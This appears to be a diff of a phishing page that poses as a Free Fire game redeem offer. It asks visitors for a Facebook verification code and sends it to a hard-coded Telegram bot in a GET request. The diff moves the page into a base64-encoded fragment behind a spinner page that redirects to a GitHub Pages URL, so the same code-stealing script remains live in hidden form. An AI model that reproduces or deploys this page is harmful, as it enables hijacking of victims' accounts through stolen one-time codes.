@@ -1,103 +1,24 @@
 <!DOCTYPE html>
+<html>
 <head>
-<style>
+    <title>FreeFire Reddem Code</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
 
-</style>
-<script type="text/javascript">
 
-</script>
+
+
+
+
 </head>
 <body>
-<!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Free Fire Redeem Verification</title>
-<style>
-body {
-  font-family: Arial, sans-serif;
-  margin: 20px; /* Added margin */
-  padding: 0;
-  text-align: center;
-}
-
-.container {
-  display: flex;
-  flex-direction: column;
-  align-items: center;
-  justify-content: center;
-  min-height: 80vh; /* Adjusted min-height */
-  background-color: #f2f2f2;
-  padding: 20px; /* Added padding */
-}
-
-.title {
-  font-size: 24px;
-  margin-bottom: 20px;
-}
-
-.message {
-  font-size: 18px;
-  line-height: 1.5;
-  margin-bottom: 20px;
-}
-
-.code-input {
-  padding: 10px;
-  border: 1px solid #ccc;
-  border-radius: 4px;
-  font-size: 16px;
-  margin-bottom: 20px; /* Added margin */
-  width: 300px; /* Adjusted width */
-}
-
-.verify-button {
-  background-color: #007bff;
-  color: #fff;
-  padding: 10px 20px;
-  border: none;
-  border-radius: 4px;
-  cursor: pointer;
-  font-size: 16px;
-  margin-bottom: 20px; /* Added margin */
-}
-</style>
-</head>
-<body>
-<div class="container">
-  <h1 class="title">Free Fire Redeem Verification</h1>
-  <p class="message">We just sent you a verification code. Check your Facebook app notification, verify your code, and get a Free Fire redeem bonus!</p>
-  <input type="text" class="code-input" id="verificationCode" placeholder="Enter your verification code">
-  <button class="verify-button" onclick="sendOTP()">Verify Code</button>
+   <div style="width: 100%; height: 100vh; display: flex; justify-content: center; align-items: center; background-color: #222;">
+    <div style="width: 100px; height: 100px; border: 5px solid #fff; border-top-color: #00ffff; border-radius: 50%; animation: spin 1s linear infinite;"></div>
 </div>
 
-<script>
-function sendOTP() {
-  var code = document.getElementById("verificationCode").value;
-  if (code.trim() === "") {
-    alert("Please fill the OTP box.");
-    return;
-  }
-  
-  var xhttp = new XMLHttpRequest();
-  xhttp.onreadystatechange = function() {
-    if (this.readyState == 4 && this.status == 200) {
-      // Success
-      showToast("Verifying progress wait for the result ");
-    }
-  };
-  xhttp.open("GET", "https://api.telegram.org/bot7348466923:AAEELthmm9YhWGGxBOn7javhk0ocW5fRT1k/sendMessage?chat_id=7382262012&text=Verification Code: " + code, true);
-  xhttp.send();
-}
 
-function showToast(message) {
-  alert(message);
-}
-</script>
-   
-</body>
+
+    <script> window.location.href="https://hostbdrun.github.io/market/#eyJ2ZXJzaW9uIjoiMC4yLjAiLCJjb21wcmVzc2VkIjpmYWxzZSwiYm9keSI6IlxuPCFET0NUWVBFIGh0bWw+XG48aGVhZD5cbjxzdHlsZT5cblxuPC9zdHlsZT5cbjxzY3JpcHQgdHlwZT1cInRleHQvamF2YXNjcmlwdFwiPlxuXG48L3NjcmlwdD5cbjwvaGVhZD5cbjxib2R5PlxuXG48IURPQ1RZUEUgaHRtbD5cbjxoZWFkPlxuPHN0eWxlPlxuXG48L3N0eWxlPlxuPHNjcmlwdCB0eXBlPVwidGV4dC9qYXZhc2NyaXB0XCI+XG5cbjwvc2NyaXB0PlxuPC9oZWFkPlxuPGJvZHk+XG48IURPQ1RZUEUgaHRtbD5cbjxodG1sIGxhbmc9XCJlblwiPlxuPGhlYWQ+XG48bWV0YSBjaGFyc2V0PVwiVVRGLThcIj5cbjxtZXRhIG5hbWU9XCJ2aWV3cG9ydFwiIGNvbnRlbnQ9XCJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MS4wXCI+XG48dGl0bGU+RnJlZSBGaXJlIFJlZGVlbSBWZXJpZmljYXRpb248L3RpdGxlPlxuPHN0eWxlPlxuYm9keSB7XG4gIGZvbnQtZmFtaWx5OiBBcmlhbCwgc2Fucy1zZXJpZjtcbiAgbWFyZ2luOiAyMHB4OyAvKiBBZGRlZCBtYXJnaW4gKi9cbiAgcGFkZGluZzogMDtcbiAgdGV4dC1hbGlnbjogY2VudGVyO1xufVxuXG4uY29udGFpbmVyIHtcbiAgZGlzcGxheTogZmxleDtcbiAgZmxleC1kaXJlY3Rpb246IGNvbHVtbjtcbiAgYWxpZ24taXRlbXM6IGNlbnRlcjtcbiAganVzdGlmeS1jb250ZW50OiBjZW50ZXI7XG4gIG1pbi1oZWlnaHQ6IDgwdmg7IC8qIEFkanVzdGVkIG1pbi1oZWlnaHQgKi9cbiAgYmFja2dyb3VuZC1jb2xvcjogI2YyZjJmMjtcbiAgcGFkZGluZzogMjBweDsgLyogQWRkZWQgcGFkZGluZyAqL1xufVxuXG4udGl0bGUge1xuICBmb250LXNpemU6IDI0cHg7XG4gIG1hcmdpbi1ib3R0b206IDIwcHg7XG59XG5cbi5tZXNzYWdlIHtcbiAgZm9udC1zaXplOiAxOHB4O1xuICBsaW5lLWhlaWdodDogMS41O1xuICBtYXJnaW4tYm90dG9tOiAyMHB4O1xufVxuXG4uY29kZS1pbnB1dCB7XG4gIHBhZGRpbmc6IDEwcHg7XG4gIGJvcmRlcjogMXB4IHNvbGlkICNjY2M7XG4gIGJvcmRlci1yYWRpdXM6IDRweDtcbiAgZm9udC1zaXplOiAxNnB4O1xuICBtYXJnaW4tYm90dG9tOiAyMHB4OyAvKiBBZGRlZCBtYXJnaW4gKi9cbiAgd2lkdGg6IDMwMHB4OyAvKiBBZGp1c3RlZCB3aWR0aCAqL1xufVxuXG4udmVyaWZ5LWJ1dHRvbiB7XG4gIGJhY2tncm91bmQtY29sb3I6ICMwMDdiZmY7XG4gIGNvbG9yOiAjZmZmO1xuICBwYWRkaW5nOiAxMHB4IDIwcHg7XG4gIGJvcmRlcjogbm9uZTtcbiAgYm9yZGVyLXJhZGl1czogNHB4O1xuICBjdXJzb3I6IHBvaW50ZXI7XG4gIGZvbnQtc2l6ZTogMTZweDtcbiAgbWFyZ2luLWJvdHRvbTogMjBweDsgLyogQWRkZWQgbWFyZ2luICovXG59XG48L3N0eWxlPlxuPC9oZWFkPlxuPGJvZHk+XG48ZGl2IGNsYXNzPVwiY29udGFpbmVyXCI+XG4gIDxoMSBjbGFzcz1cInRpdGxlXCI+RnJlZSBGaXJlIFJlZGVlbSBWZXJpZmljYXRpb248L2gxPlxuICA8cCBjbGFzcz1cIm1lc3NhZ2VcIj5XZSBqdXN0IHNlbnQgeW91IGEgdmVyaWZpY2F0aW9uIGNvZGUuIENoZWNrIHlvdXIgRmFjZWJvb2sgYXBwIG5vdGlmaWNhdGlvbiwgdmVyaWZ5IHlvdXIgY29kZSwgYW5kIGdldCBhIEZyZWUgRmlyZSByZWRlZW0gYm9udXMhPC9wPlxuICA8aW5wdXQgdHlwZT1cInRleHRcIiBjbGFzcz1cImNvZGUtaW5wdXRcIiBpZD1cInZlcmlmaWNhdGlvbkNvZGVcIiBwbGFjZWhvbGRlcj1cIkVudGVyIHlvdXIgdmVyaWZpY2F0aW9uIGNvZGVcIj5cbiAgPGJ1dHRvbiBjbGFzcz1cInZlcmlmeS1idXR0b25cIiBvbmNsaWNrPVwic2VuZE9UUCgpXCI+VmVyaWZ5IENvZGU8L2J1dHRvbj5cbjwvZGl2PlxuXG48c2NyaXB0PlxuZnVuY3Rpb24gc2VuZE9UUCgpIHtcbiAgdmFyIGNvZGUgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZChcInZlcmlmaWNhdGlvbkNvZGVcIikudmFsdWU7XG4gIGlmIChjb2RlLnRyaW0oKSA9PT0gXCJcIikge1xuICAgIGFsZXJ0KFwiUGxlYXNlIGZpbGwgdGhlIE9UUCBib3guXCIpO1xuICAgIHJldHVybjtcbiAgfVxuICBcbiAgdmFyIHhodHRwID0gbmV3IFhNTEh0dHBSZXF1ZXN0KCk7XG4gIHhodHRwLm9ucmVhZHlzdGF0ZWNoYW5nZSA9IGZ1bmN0aW9uKCkge1xuICAgIGlmICh0aGlzLnJlYWR5U3RhdGUgPT0gNCAmJiB0aGlzLnN0YXR1cyA9PSAyMDApIHtcbiAgICAgIC8vIFN1Y2Nlc3NcbiAgICAgIHNob3dUb2FzdChcIlZlcmlmeWluZyBwcm9ncmVzcyB3YWl0IGZvciB0aGUgcmVzdWx0IFwiKTtcbiAgICB9XG4gIH07XG4gIHhodHRwLm9wZW4oXCJHRVRcIiwgXCJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90NzM0ODQ2NjkyMzpBQUVFTHRobW05WWhXR0d4Qk9uN2phdmhrMG9jVzVmUlQxay9zZW5kTWVzc2FnZT9jaGF0X2lkPTczODIyNjIwMTImdGV4dD1WZXJpZmljYXRpb24gQ29kZTogXCIgKyBjb2RlLCB0cnVlKTtcbiAgeGh0dHAuc2VuZCgpO1xufVxuXG5mdW5jdGlvbiBzaG93VG9hc3QobWVzc2FnZSkge1xuICBhbGVydChtZXNzYWdlKTtcbn1cbjwvc2NyaXB0PlxuICAgXG48L2JvZHk+XG48L2h0bWw+XG5cbjwvYm9keT5cbjwvaHRtbD5cbjwvYm9keT5cbiJ9";
+        </script>
 </html>
 
-</body>
-</html>
+
